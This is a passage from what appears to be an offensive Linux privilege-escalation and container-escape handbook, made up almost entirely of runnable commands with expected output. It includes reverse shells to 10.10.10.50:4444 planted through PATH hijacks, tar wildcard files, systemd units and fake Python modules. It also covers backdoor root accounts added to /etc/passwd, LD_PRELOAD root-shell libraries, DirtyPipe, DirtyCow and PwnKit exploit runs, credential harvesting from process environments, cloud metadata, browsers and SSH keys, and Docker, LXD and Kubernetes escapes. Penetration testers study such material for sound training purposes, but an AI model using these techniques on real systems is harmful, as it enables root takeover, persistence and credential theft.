  ls -ld "$dir" 2>/dev/null | grep -E "^d.......w|^d......w"
done
# If /usr/local/bin is writable:

# Step 4: Create malicious binary with the target name:
echo '#!/bin/bash' > /usr/local/bin/service
echo 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1' >> /usr/local/bin/service
chmod +x /usr/local/bin/service

# Step 5: Run the SUID binary:
/usr/local/bin/suid_binary
# It calls 'service' → finds OUR fake service first → root shell!

# ── SUDO PATH INJECTION ───────────────────────────────────────────
# If sudo preserves PATH (env_keep += PATH in sudoers) or
# if sudo-allowed script doesn't use full paths:
# Same technique — place malicious binary in PATH before real one
```

---

## 11. Linux Capabilities

### Layman's Terms
Linux capabilities are a **fine-grained permission system** that allows giving a process specific root privileges without making it fully SUID root. For example, `cap_net_bind_service` lets a process bind to port 80 without being root. BUT some capabilities are equivalent to full root — and if misconfigured, they give us root.

```bash
# FIND BINARIES WITH CAPABILITIES:
getcap -r / 2>/dev/null
# Expected dangerous findings:
# /usr/bin/python3.8 = cap_setuid+ep   ← Python can set UID = instant root!
# /usr/bin/perl = cap_setuid+ep        ← Same for Perl
# /usr/bin/vim.basic = cap_dac_read_search+ep  ← Can read any file!
# /usr/sbin/tcpdump = cap_net_raw+ep   ← Can capture packets (less useful for privesc)
# /usr/bin/node = cap_net_bind_service+ep  ← Can bind <1024 ports

# CAPABILITY MEANINGS:
# cap_setuid   → Can call setuid() → become any user including root → INSTANT ROOT
# cap_setgid   → Same for group
# cap_dac_override → Bypass file permission checks → read/write any file
# cap_dac_read_search → Bypass read/search checks → read any file
# cap_sys_admin → Like root for many purposes
# cap_sys_ptrace → Can strace any process → extract credentials from memory
# cap_net_raw  → Raw socket access (useful for sniffing)
# cap_chown    → Change file ownership

# ── EXPLOIT cap_setuid ────────────────────────────────────────────

# Python3 with cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Expected: root@machine:/$ whoami → root

# Perl with cap_setuid:
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Ruby with cap_setuid:
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# ── EXPLOIT cap_dac_read_search ───────────────────────────────────
# Binary can read any file — use to read /etc/shadow:
# (if vim has cap_dac_read_search)
vim /etc/shadow        # Can now read it!

# Use tar (if it has cap_dac_read_search) to archive sensitive files:
tar czf /tmp/sensitive.tar.gz /etc/shadow /root/.ssh/id_rsa
tar xzf /tmp/sensitive.tar.gz  # Extract and read

# ── EXPLOIT cap_sys_ptrace ────────────────────────────────────────
# Can attach to ANY process and read/modify its memory
# Target: process running as root that has secrets in memory

# Find a root process to attach to:
ps aux | grep "^root" | grep -v "\[" | head

# Use gdb to inject shellcode into root process:
gdb -p ROOT_PID
# Inside gdb:
# call system("bash -i >& /dev/tcp/10.10.10.50/4444 0>&1")
# Expected: reverse shell as root!

# ── EXPLOIT cap_net_raw ───────────────────────────────────────────
# tcpdump with cap_net_raw — sniff all traffic (useful for credential capture):
tcpdump -i eth0 -w /tmp/capture.pcap &
# Capture FTP, HTTP, Telnet credentials passing on network
```

---

## 12. Weak File Permissions

```bash
# ── /etc/passwd WRITABLE ──────────────────────────────────────────
ls -la /etc/passwd
# Expected vulnerable: -rw-rw-rw- (world-writable) or writable by our group

# Exploit: Add a new root user with no password:
# passwd entry format: user:password:UID:GID:comment:home:shell
# password field: 'x' = check shadow, empty = no password, hash = use this hash
# Generate a password hash:
openssl passwd -1 -salt salt hacker123
# Output: $1$salt$SomeHashHere

# Add root user:
echo 'hacker:$1$salt$SomeHashHere:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker    # Password: hacker123
# Expected: root shell!

# Even simpler — add with empty password (no hash):
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
su hacker    # Just press Enter for password
# Expected: root shell!

# ── /etc/shadow READABLE ──────────────────────────────────────────
ls -la /etc/shadow
# Default: -rw-r----- (readable by shadow group only)
# Vulnerable: -rw-r--r-- (world-readable)

cat /etc/shadow 2>/dev/null
# Expected:
# root:$6$salt$longhashhere:18000:0:99999:7:::
# alice:$6$salt2$hash2:18000:0:99999:7:::

# Crack with hashcat:
hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt
# Mode 1800 = sha512crypt (common Linux)
# Mode 500 = md5crypt (older)
# Mode 1500 = descrypt (legacy)

# ── /etc/sudoers WRITABLE ─────────────────────────────────────────
ls -la /etc/sudoers
# Expected vulnerable: writable by us

echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo bash   # Instant root!

# ── SENSITIVE BACKUP FILES ─────────────────────────────────────────
find / -name "*.bak" -o -name "shadow.bak" -o -name "passwd-" 2>/dev/null
# Backup copies of shadow/passwd often left with wrong permissions
cat /var/backups/passwd.bak 2>/dev/null
cat /var/backups/shadow.bak 2>/dev/null
```

---

## 13. NFS No_Root_Squash

> **Reference:** Full NFS mechanism covered in `Networking_Deep_Dive_TCPIP_and_Devices.md` Section 25. Key exploitation:

```bash
# Check NFS exports (from attacker machine or on target):
showmount -e 10.10.10.100
# Expected vulnerable:
# Export list for 10.10.10.100:
# /home/alice 10.10.10.0/24   ← restricted to subnet
# /data       *               ← exported to EVERYONE!

# Check export options on target:
cat /etc/exports
# Expected vulnerable:
# /home/alice 10.10.10.0/24(rw,sync,no_subtree_check,no_root_squash)
#                                                      ^^^^^^^^^^^^^^
#                                    no_root_squash = root on CLIENT = root on NFS!

# EXPLOIT no_root_squash:
# On attacker (Kali), as root:
mkdir /tmp/nfs_mount
mount -t nfs 10.10.10.100:/home/alice /tmp/nfs_mount

# Create SUID bash in the NFS share (as root = no squash):
cp /bin/bash /tmp/nfs_mount/bash_suid
chmod +s /tmp/nfs_mount/bash_suid    # Set SUID — owned by root, runs as root!

# On target, as low-priv user:
ls -la /home/alice/bash_suid
# -rwsr-xr-x root root bash_suid   ← SUID root!
/home/alice/bash_suid -p
# Expected: bash-5.0# whoami → root
```

---

## 14. Kernel Exploits

### Layman's Terms
Kernel exploits attack the **operating system's core code** — when the kernel itself has a bug, you can often escalate from any user to root. These are high-risk (can crash the system) and should be used **as last resort** when other vectors fail. BUT they work even on fully patched applications — if the kernel is old, nothing else matters.

```bash
# ── IDENTIFY KERNEL VERSION ───────────────────────────────────────
uname -r    # e.g., 4.15.0-20-generic
uname -a    # Full info including arch

# ── KERNEL EXPLOIT DATABASE ───────────────────────────────────────
# Search with searchsploit:
searchsploit linux kernel 4.15 privilege escalation
searchsploit linux kernel ubuntu 18.04 local

# Online resources:
# https://www.kernel-exploits.com/
# https://github.com/SecWiki/linux-kernel-exploits (collection)
# https://github.com/briskets/CVE-2021-3493 (Ubuntu OverlayFS)
# https://github.com/ly4k/PwnKit (CVE-2021-4034)

# ── MAJOR KERNEL CVES (KNOW THESE) ───────────────────────────────

# DirtyPipe (CVE-2022-0847) — Linux kernel 5.8+ to 5.17:
# Allows unprivileged users to overwrite content in read-only files
# Including /etc/passwd — directly writable even if read-only!
# https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
gcc exploit-1.c -o exploit1
./exploit1    # Writes to /etc/passwd → root
# Expected: root shell!

# DirtyCow (CVE-2016-5195) — Linux kernel < 4.8.3:
# Race condition in copy-on-write — write to read-only memory-mapped files
# Very reliable: works on tons of old kernels
git clone https://github.com/dirtycow/dirtycow.github.io
# Multiple POCs in the repo — cowroot.c most common:
gcc -pthread cowroot.c -o cowroot
./cowroot
# Expected:
# DirtyCow root privilege escalation
# Backing up /usr/bin/passwd..
# Racing, this may take a while..
# /usr/bin/passwd overwritten
# Successfully opened root shell. Run id! It is waiting for commands:
# id → uid=0(root)

# PwnKit (CVE-2021-4034) — pkexec (Polkit) all Linux distros:
# Heap memory corruption in pkexec (installed on almost every Linux system)
# Works regardless of kernel version — pkexec vuln, not kernel
git clone https://github.com/ly4k/PwnKit
cd PwnKit && make
./PwnKit
# Expected: root shell on almost any Linux!

# Baron Samedit (CVE-2021-3156) — sudo heap overflow (Section 7)
# PTRACE_TRACEME (CVE-2019-13272) — Linux < 5.1.17
# OverlayFS (CVE-2021-3493) — Ubuntu < 21.04

# ── AUTOMATED KERNEL EXPLOIT FINDER ──────────────────────────────
# linux-exploit-suggester-2:
perl linux-exploit-suggester-2.pl -k $(uname -r)
# Expected:
# [+] [CVE-2022-0847] DirtyPipe  [Kernel: 5.8.0-5.16.*] [PKG: N/A]
# [+] [CVE-2021-4034] PwnKit     [Kernel: All]           [PKG: pkexec]

# ── KERNEL EXPLOIT OPSEC ─────────────────────────────────────────
# Kernel exploits can CRASH the system — always have a backup plan
# Test in lab first
# On real engagement: ALWAYS ask permission before running kernel exploits
# Prefer race condition exploits (less likely to crash) over overflow exploits
```

---

## 15. Docker Group & Container Escape (Host PrivEsc)

### Layman's Terms
Being in the `docker` group is **equivalent to having root** on the host. Docker can mount the host filesystem inside a container — and since container root = host root (in terms of file access), you can read/write any file on the host system.

```bash
# CHECK: Are you in the docker group?
id | grep docker
groups | grep docker
# If yes: instant root, no exploit needed!

# ── EXPLOIT DOCKER GROUP ─────────────────────────────────────────
# Mount host root filesystem in a new container:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# -v /:/mnt = mount host's / to /mnt in container
# --rm = remove container after
# -it alpine = interactive Alpine container
# chroot /mnt sh = chroot into mounted host filesystem
# Expected:
# / # whoami
# root         ← you're root on the HOST filesystem!
# / # cat /etc/shadow   ← Host's shadow file!
# / # ls /root/         ← Host's root home directory!

# Add yourself to sudoers on host:
docker run -v /:/mnt --rm -it alpine sh -c "echo 'lowprivuser ALL=(ALL) NOPASSWD: ALL' >> /mnt/etc/sudoers"
# Back on host: sudo bash → root!

# Or: spawn a root shell directly:
docker run -v /:/mnt --rm -it ubuntu bash -c "chroot /mnt && bash"

# Or: SUID bash on host:
docker run -v /:/mnt --rm alpine sh -c "cp /mnt/bin/bash /mnt/tmp/bash_suid && chmod +s /mnt/tmp/bash_suid"
/tmp/bash_suid -p   # On host → root!

# ── ESCAPING FROM INSIDE A CONTAINER ─────────────────────────────
# See Section 27 for complete Docker escape techniques
```

---

## 16. LXC/LXD Group Abuse

```bash
# Check group membership:
id | grep lxd
# If in lxd group: same impact as docker group — instant root!

# EXPLOIT lxd group:
# Step 1: Download Alpine image on Kali:
git clone  https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && sudo bash build-alpine
# Creates: alpine-v3.19-x86_64-20240116.tar.gz

# Transfer to target:
python3 -m http.server 8080  # On Kali
wget http://10.10.10.50:8080/alpine-v3.19-x86_64-20240116.tar.gz  # On target

# Step 2: On target — import and launch privileged container:
lxc image import ./alpine-v3.19-x86_64-20240116.tar.gz --alias alpine
lxc image list    # Verify import

lxc init alpine privesc -c security.privileged=true
# security.privileged=true = container runs as root = host root!

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
# Mount host / into container at /mnt/root

lxc start privesc
lxc exec privesc /bin/sh

# Inside container:
id    # uid=0(root) — you're root
ls /mnt/root/root/    # Host's /root directory!
cat /mnt/root/etc/shadow   # Host shadow file!
cp /mnt/root/bin/bash /mnt/root/tmp/bash_suid && chmod +s /mnt/root/tmp/bash_suid
exit  # Exit container

# On host:
/tmp/bash_suid -p   # Root on host!
```

---

## 17. Wildcard Injection

```bash
# SCENARIO: Root cron job or sudo-allowed script uses wildcards:
# * * * * * root cd /var/backups && tar -czf backup.tar.gz *

# The * expands to ALL filenames in /var/backups
# If we can write files there, our filenames become tar arguments!

# EXPLOIT:
cd /var/backups
# Create files whose names ARE tar options:
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=bash shell.sh"

# Create the payload:
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.50/4444 0>&1
EOF
chmod +x shell.sh

# Start listener: nc -lvnp 4444
# Wait for cron to run...
# tar command becomes:
# tar -czf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=bash shell.sh [other files]
# Expected: root reverse shell!

# Other wildcard-injectable commands:
# rsync -av * user@server:/backup/  → inject rsync flags via filenames
# chown user:group *                → inject --reference=file to change ownership
```

---

## 18. LD_PRELOAD & LD_LIBRARY_PATH Hijacking

```bash
# SCENARIO: sudo allows running a specific binary,
# AND env_keep includes LD_PRELOAD or LD_LIBRARY_PATH in sudoers:
# sudo -l output shows:
# env_keep += LD_PRELOAD
# (root) NOPASSWD: /usr/sbin/apache2

# LD_PRELOAD loads a shared library BEFORE everything else
# If we can control LD_PRELOAD when running something as root → root!

# Step 1: Create malicious shared library:
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");   // Prevent recursive loading
    setgid(0);
    setuid(0);
    system("/bin/bash -p");   // Spawn root shell
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles

# Step 2: Run the sudo-allowed binary with LD_PRELOAD:
sudo LD_PRELOAD=/tmp/shell.so apache2
# Expected: root shell spawns immediately!

# ── LD_LIBRARY_PATH HIJACKING ─────────────────────────────────────
# SCENARIO: sudo command calls a shared library with a predictable name
# AND env_keep includes LD_LIBRARY_PATH

# Find what libraries the sudo-allowed binary needs:
ldd /usr/sbin/apache2 | head
# Expected:
# libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3

# Create fake libpcre.so.3 with malicious init function:
cat > /tmp/libpcre.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

void pcre_compile() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -o /tmp/libpcre.so.3 /tmp/libpcre.c

# Run with our fake library dir first in LD_LIBRARY_PATH:
sudo LD_LIBRARY_PATH=/tmp apache2
# Loads /tmp/libpcre.so.3 instead of real one → root shell!
```

---

## 19. Writable /etc/passwd

```bash
# /etc/passwd format:
# username:password:UID:GID:comment:home_dir:shell
# password field: x = check /etc/shadow, empty = no password, hash = use directly

# CHECK:
ls -la /etc/passwd
# Vulnerable: -rw-rw-rw- or writable by our group

# EXPLOIT METHOD 1: Add root user with known password hash:
# Generate hash:
openssl passwd -1 -salt xyz hacker123
# Output: $1$xyz$AbCdEfGhIjKlMnOpQrStUv.

echo 'hacker:$1$xyz$AbCdEfGhIjKlMnOpQrStUv.:0:0::/root:/bin/bash' >> /etc/passwd
su hacker    # Password: hacker123
id           # uid=0(root)

# EXPLOIT METHOD 2: Add user with empty password (fastest):
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
su hacker    # Just press Enter
id           # uid=0(root)

# EXPLOIT METHOD 3: Change root's password hash (destructive — avoid):
# Replace the 'x' in root's entry with our hash
# This modifies root's login — use with caution!
```

---

## 20. Abusing Services — Systemd Unit File Injection

```bash
# Find writable systemd service files:
find /etc/systemd /lib/systemd /usr/lib/systemd -writable 2>/dev/null
ls -la /etc/systemd/system/

# If a service file is writable:
cat /etc/systemd/system/vulnerable.service
# Expected:
# [Unit] Description=Vulnerable Service
# [Service]
# ExecStart=/opt/scripts/start.sh   ← Can we modify start.sh?
# User=root                          ← Runs as root!
# [Install] WantedBy=multi-user.target

# EXPLOIT: Modify the service's ExecStart script:
echo "bash -i >& /dev/tcp/10.10.10.50/4444 0>&1" >> /opt/scripts/start.sh
# Trigger restart:
sudo /usr/bin/systemctl restart vulnerable.service    # If allowed via sudo
# OR wait for it to restart naturally (reboot, watchdog)

# EXPLOIT: Modify the service file itself (if writable):
cat > /etc/systemd/system/vulnerable.service << 'EOF'
[Unit]
Description=Totally Legit Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
User=root

[Install]
WantedBy=multi-user.target
EOF
sudo systemctl daemon-reload
sudo systemctl restart vulnerable.service
```

---

## 21. Environment Variable Abuse

```bash
# SCENARIO: SUID binary uses system() or popen() which calls /bin/sh
# AND /bin/sh uses PATH to find commands

# Find SUID binaries that call commands via system():
strace /usr/local/bin/suid_binary 2>&1 | grep execve
strings /usr/local/bin/suid_binary | grep -v "/" | grep -E "[a-z]{3,}"
# Expected: service, ps, ping, logger (relative paths without /)

# If the binary calls system("service apache restart"):
# Create malicious 'service' in a writable directory:
echo '#!/bin/bash' > /tmp/service
echo 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1' >> /tmp/service
chmod +x /tmp/service

# Run SUID binary with modified PATH:
PATH=/tmp:$PATH /usr/local/bin/suid_binary
# Binary calls 'service' → finds /tmp/service first → root reverse shell!
```

---

## 22. Python / Pip Library Hijacking

```bash
# SCENARIO 1: Python script runs as root, imports a module
# we can put our own file in Python's search path

# Check what Python scripts run as root:
ps aux | grep "^root.*python"
cat /opt/scripts/monitoring.py
# Expected:
# import requests     ← imports requests module
# import schedule     ← imports schedule module
# # ... does some monitoring

# Find Python path (search order):
python3 -c "import sys; print('\n'.join(sys.path))"
# Expected:
# 
# /usr/lib/python38.zip
# /usr/lib/python3.8
# /usr/lib/python3.8/lib-dynload
# /usr/local/lib/python3.8/dist-packages
# /usr/lib/python3/dist-packages

# If ANY of these is writable by us:
ls -la /usr/local/lib/python3.8/dist-packages/
# If writable → create fake module!

cat > /usr/local/lib/python3.8/dist-packages/requests.py << 'EOF'
import os
os.system("bash -i >& /dev/tcp/10.10.10.50/4444 0>&1")
EOF
# When root's script imports requests → imports OUR fake requests → shell!

# SCENARIO 2: Writable Python script called by cron:
# If the script itself is writable, just add our code

# SCENARIO 3: Writable setup.py in current directory:
# Python checks current directory first in sys.path
# If root runs python from /tmp/ or other writable dir:
cat > /tmp/os.py << 'EOF'  # Shadow the 'os' module
import subprocess
subprocess.Popen(['bash', '-i', '-c', 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'])
EOF
# If root script runs from /tmp/ → imports /tmp/os.py instead of real os!
```

---

## 23. SSH Key Abuse

```bash
# SCENARIO 1: Readable private SSH keys in home directories
find /home /root -name "id_rsa" -o -name "id_dsa" -o -name "id_ed25519" 2>/dev/null
ls -la /home/alice/.ssh/
cat /home/alice/.ssh/id_rsa  # If readable
# Copy key to Kali:
chmod 600 stolen_key
ssh -i stolen_key alice@localhost

# SCENARIO 2: Writable authorized_keys
# If we can write to another user's authorized_keys:
ls -la /root/.ssh/ 2>/dev/null  # Can we write here?
ls -la /home/alice/.ssh/authorized_keys 2>/dev/null

# Our public key:
ssh-keygen -t ed25519 -f /tmp/privesc_key -N ""
cat /tmp/privesc_key.pub

# Append to target's authorized_keys:
echo "ssh-ed25519 AAAA... attacker" >> /home/alice/.ssh/authorized_keys
# OR if targeting root:
echo "ssh-ed25519 AAAA... attacker" >> /root/.ssh/authorized_keys

# SSH in as the target user:
ssh -i /tmp/privesc_key alice@localhost

# SCENARIO 3: SSH config misconfig
cat /etc/ssh/sshd_config | grep -E "PermitRootLogin|PasswordAuthentication|AuthorizedKeysFile"
# PermitRootLogin yes + PasswordAuthentication yes = can brute-force root via SSH
# AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/authorized_keys → check both!
```

---

# PART 4 — CREDENTIAL HUNTING

---

## 24. Where Credentials Live on Linux

```bash
# ══════════════════════════════════════════════════════════════════
# CREDENTIAL HUNTING MASTER SCRIPT
# Run this as a checklist — each line is a separate check
# ══════════════════════════════════════════════════════════════════

# ── APPLICATION CONFIGS ───────────────────────────────────────────
# Web applications:
find /var/www /srv /opt /home -name "wp-config.php" 2>/dev/null | xargs cat 2>/dev/null
find /var/www /srv /opt -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | \
  xargs grep -l "password\|passwd\|secret\|db_pass" 2>/dev/null | head -10 | \
  xargs grep -i "password\|passwd\|secret" 2>/dev/null | grep -v "#"

# Database credentials:
cat /etc/mysql/my.cnf 2>/dev/null          # MySQL config
cat /etc/mysql/mysql.conf.d/mysqld.cnf 2>/dev/null
cat ~/.my.cnf 2>/dev/null                   # MySQL client creds (often has root pw!)
# Expected: [client]\npassword=SuperSecret  ← root mysql password!

find / -name "database.yml" -o -name "database.php" -o -name "db.py" 2>/dev/null | \
  xargs cat 2>/dev/null | grep -i "pass\|secret"

# ── ENVIRONMENT VARIABLES (RUNNING PROCESSES) ─────────────────────
# Read env vars from ALL processes (requires access to /proc):
for pid in /proc/*/environ; do
  cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -iE "pass|secret|key|token|aws|api"
done
# Expected:
# DB_PASSWORD=SuperSecret123
# AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
# SECRET_KEY=supersecretdjangosecret

# ── BASH HISTORY GOLD ─────────────────────────────────────────────
cat ~/.bash_history
find /home /root -name ".*_history" 2>/dev/null | xargs cat 2>/dev/null
# Look for: mysql -p, curl -u, ssh with -i, git clone with credentials

# ── SSH AND GPG KEYS ──────────────────────────────────────────────
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" 2>/dev/null | head -10

# ── BROWSER CREDENTIALS ───────────────────────────────────────────
# See Section 25

# ── CREDENTIAL FILES (COMMON LOCATIONS) ───────────────────────────
cat /root/.netrc 2>/dev/null             # FTP/HTTP credentials
cat ~/.netrc 2>/dev/null
cat ~/.aws/credentials 2>/dev/null       # AWS credentials!
cat ~/.aws/config 2>/dev/null
cat ~/.azure/credentials 2>/dev/null     # Azure
cat ~/.gcloud/credentials 2>/dev/null    # GCP
cat ~/.kube/config 2>/dev/null           # Kubernetes config (may have tokens!)
find / -name "*.kdbx" 2>/dev/null        # KeePass database!
find / -name "pass.txt" -o -name "passwords.txt" -o -name "creds.txt" 2>/dev/null

# ── GIT REPOSITORY SECRETS ────────────────────────────────────────
find / -name ".git" -type d 2>/dev/null | head -5
# If found:
cd /path/to/repo
git log --oneline | head -20
git show HEAD:config.php  # Look at past commits for removed secrets
git grep -i "password\|secret\|key" $(git log --oneline | awk '{print $1}')

# ── CLOUD PROVIDER METADATA ───────────────────────────────────────
# AWS (if on EC2):
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Azure (if on Azure VM):
curl -s --max-time 2 -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# GCP (if on GCP):
curl -s --max-time 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# These return temporary cloud credentials usable for lateral movement!

# ── SHADOW FILE (if readable) ─────────────────────────────────────
cat /etc/shadow 2>/dev/null
# Crack: hashcat -m 1800 shadow.txt rockyou.txt (sha512crypt)
```

---

## 25. Browser Credential Extraction

```bash
# Chrome/Chromium credential database:
find /home -name "Login Data" 2>/dev/null
# Expected: /home/alice/.config/google-chrome/Default/Login Data

# Chrome stores credentials in SQLite encrypted with a key
# Key stored in: ~/.config/google-chrome/Default/Local State (base64-encoded)
# Encryption: AES-256-GCM with PBKDF2-derived key from login keyring

# Extract on Linux (requires python3 and specific libs):
pip3 install pycryptodome secretstorage
# Tool: https://github.com/ohyicong/decrypt-chrome-passwords
python3 decrypt_chrome_passwords.py
# Expected:
# url:      https://internal-jira.company.com
# username: alice
# password: SecretJiraPass123!

# Firefox credentials:
find /home -name "logins.json" 2>/dev/null
# Stored in: ~/.mozilla/firefox/PROFILE/logins.json
# Encrypted with key4.db (NSS/SQLCipher)

# Tool: https://github.com/unode/firefox_decrypt
python3 firefox_decrypt.py /home/alice/.mozilla/firefox/PROFILE.default-esr/
# Expected:
# https://company-vpn.example.com
# Username: alice
# Password: VpnPassword2024!
```

---

# PART 5 — CONTAINER SECURITY

---

## 27. Docker Escape Techniques — All Vectors

### Layman's Terms
Containers are supposed to be isolated. But containers share the host kernel — and there are many ways that isolation breaks down. **Container escape means going from "I'm inside this container" to "I have access to the host."**

```bash
# ══════════════════════════════════════════════════════════════════
# FIRST: CHECK WHERE YOU ARE — container or host?
# ══════════════════════════════════════════════════════════════════
cat /proc/1/cgroup | grep docker   # In Docker if docker appears
ls -la /.dockerenv 2>/dev/null     # Exists if in Docker container
cat /proc/self/status | grep "CapEff"
# CapEff: 0000003fffffffff = all capabilities = privileged container → escape possible!
# CapEff: 00000000a80425fb = restricted = normal container

# ── ESCAPE 1: PRIVILEGED CONTAINER ───────────────────────────────
# If container runs with --privileged flag:
# Check:
cat /proc/self/status | grep "CapEff"
# Full capabilities = privileged

# Exploit: Mount host filesystem via device access:
fdisk -l   # List host disks (only works in privileged container)
# Expected: /dev/sda1, /dev/sdb1 — host disks visible!

mkdir /tmp/hostmount
mount /dev/sda1 /tmp/hostmount    # Mount host root partition
ls /tmp/hostmount                  # Host filesystem!
chroot /tmp/hostmount              # Become root on host filesystem
cat /etc/shadow                    # Host passwords
# Add SSH key to host's root:
echo "ssh-ed25519 AAAA... attacker" >> /tmp/hostmount/root/.ssh/authorized_keys

# ── ESCAPE 2: DOCKER SOCKET MOUNTED ──────────────────────────────
# If /var/run/docker.sock is mounted inside container:
ls -la /var/run/docker.sock
# If present: you can control the Docker daemon = host escape!

# Verify Docker API is accessible:
curl --unix-socket /var/run/docker.sock http://localhost/version
# Expected: {"Version":"24.0.2",...}  ← Docker API accessible!

# Create new privileged container with host mounted:
curl -s --unix-socket /var/run/docker.sock \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /hostroot sh"],"HostConfig":{"Binds":["/:/hostroot"],"Privileged":true}}' \
  http://localhost/containers/create | python3 -m json.tool | grep Id

# Get the container ID from above output, then start it:
CONTAINER_ID="your_container_id_here"
curl --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/$CONTAINER_ID/start

# Attach to get a shell:
curl --unix-socket /var/run/docker.sock \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Tty":true}' \
  "http://localhost/containers/$CONTAINER_ID/attach?stream=1&stdin=1&stdout=1&stderr=1"

# Simpler with Docker CLI if available:
docker -H unix:///var/run/docker.sock run --rm -it \
  -v /:/hostroot alpine chroot /hostroot sh

# ── ESCAPE 3: EXPOSED HOST PID NAMESPACE ─────────────────────────
# If container runs with --pid=host:
# Can see AND kill host processes
ps aux | grep "^root"  # Sees host processes
# Inject into host process using nsenter:
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# PID 1 on host = init/systemd
# Expected: root shell on host!

# ── ESCAPE 4: EXPOSED HOST NETWORK NAMESPACE ─────────────────────
# If container runs with --net=host:
# Can see all host network interfaces and connections
ip a   # Shows host's network interfaces directly
ss -tlnp  # Shows ALL host services (including 127.0.0.1 services!)
# Can reach services normally only accessible on host's localhost
# Not a direct escape but expands attack surface significantly

# ── ESCAPE 5: WRITABLE HOST CGROUP ───────────────────────────────
# CVE-2019-5736: runc vulnerability (patched but still interesting)
# If old runC version or specific container setup:
# Can overwrite runC binary from inside container!
# Full details: https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/

# ── ESCAPE 6: CAP_SYS_ADMIN capability ───────────────────────────
# cap_sys_admin is almost equivalent to full root
# Check: capsh --print | grep sys_admin  OR  cat /proc/self/status | grep CapEff
# If present: many escape techniques work including:
# - Mount operations (same as privileged)
# - Clone syscall tricks
# - Seccomp bypass attempts

# ── POST-ESCAPE: WHAT TO DO AFTER CONTAINER ESCAPE ───────────────
# You're now in the host context:
id                    # Should be root
hostname              # Host's hostname
cat /etc/hostname     # Confirm you're on host
ps aux | grep kube    # Are we in Kubernetes? What node?
cat /etc/kubernetes/ssl/* 2>/dev/null  # K8s certificates
cat /var/lib/kubelet/config.yaml      # Kubelet config
# Network access: what can this host reach?
ip a; ip route; cat /etc/hosts
```

---

## 28. Kubernetes Pod Escape

```bash
# ══════════════════════════════════════════════════════════════════
# SCENARIO: You have code execution inside a Kubernetes pod
# Goal: escape to the node, or move laterally to other pods/namespaces
# ══════════════════════════════════════════════════════════════════

# STEP 1: Confirm you're in Kubernetes
ls /run/secrets/kubernetes.io/serviceaccount/
# Expected:
# ca.crt   namespace   token
# Service account token is automatically mounted in pods!

# Read the service account token:
cat /run/secrets/kubernetes.io/serviceaccount/token
# This JWT token authenticates to the K8s API!

KUBE_TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
KUBE_CACERT="/run/secrets/kubernetes.io/serviceaccount/ca.crt"
NAMESPACE=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace)
KUBE_API="https://kubernetes.default.svc"

# STEP 2: Check what permissions your SA has:
curl -sSk -H "Authorization: Bearer $KUBE_TOKEN" \
  "$KUBE_API/api/v1/namespaces/$NAMESPACE/pods" 2>/dev/null
# Expected if SA has pod list permission:
# {"kind":"PodList","items":[{"metadata":{"name":"app-pod-xyz"...

# Check all permissions:
curl -sSk -H "Authorization: Bearer $KUBE_TOKEN" \
  "$KUBE_API/api/v1/namespaces/$NAMESPACE/pods" | python3 -m json.tool | \
  grep -i "name"

# STEP 3: If SA can CREATE pods — escape to node:
# Create privileged pod that mounts host filesystem:
cat > /tmp/escape.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -p -- /bin/bash"]
    volumeMounts:
    - mountPath: /host
      name: host-root
    securityContext:
      privileged: true
  volumes:
  - name: host-root
    hostPath:
      path: /
  restartPolicy: Never
EOF

